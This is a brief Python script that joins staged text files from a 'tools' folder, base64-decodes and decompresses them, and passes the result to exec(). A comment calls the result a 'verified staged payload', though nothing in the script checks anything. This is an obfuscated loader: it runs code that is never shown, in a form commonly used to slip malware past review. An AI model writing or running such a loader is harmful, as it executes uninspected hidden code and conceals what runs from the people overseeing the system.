from pathlib import Path
import base64, zlib

# Assemble the verified staged payload in lexical order.
payload = ''.join(
    p.read_text()
    for p in sorted(Path('tools').glob('file10-r20-payload-*.txt'))
)
exec(zlib.decompress(base64.b64decode(payload)).decode())
